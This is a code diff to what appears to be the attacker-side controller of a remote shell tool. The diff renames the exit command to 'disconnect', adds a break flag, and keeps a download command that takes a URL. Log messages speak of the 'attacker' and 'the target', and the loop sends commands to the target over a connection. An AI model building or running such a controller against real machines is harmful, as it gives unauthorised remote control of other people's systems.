@@ -109,6 +109,7 @@ def main():
                     path = handler.decode(data)
 
                     valid_internal_cmd = False
+                    break_it = False
 
                     while not valid_internal_cmd:
                         full_cmd, iic, rl_cmd, params = get_shell_cmd(path)
@@ -116,15 +117,18 @@ def main():
 
                         # NOTE(jenchieh): Check possible command at this moment.
                         if iic:
-                            # Check exit command before receiving.
-                            if rl_cmd == command.Command.EXIT.value:
-                                logger.info("Attacker exit the target...")
-                                break
-                            if rl_cmd == command.Command.DOWNLOAD.value:
+                            # Check disconnect command before receiving.
+                            if rl_cmd == command.Command.DISCONNECT.value:
+                                logger.info("Attacker disconnect the target...")
+                                break_it = True
+                            elif rl_cmd == command.Command.DOWNLOAD.value:
                                 if params_len < 1:
                                     logger.error("Cannot download the file without the URL...")
                                     continue
                         valid_internal_cmd = True
+
+                    if break_it:
+                        break
 
                     # Send command.
                     conn.sendall(handler.encode(full_cmd))
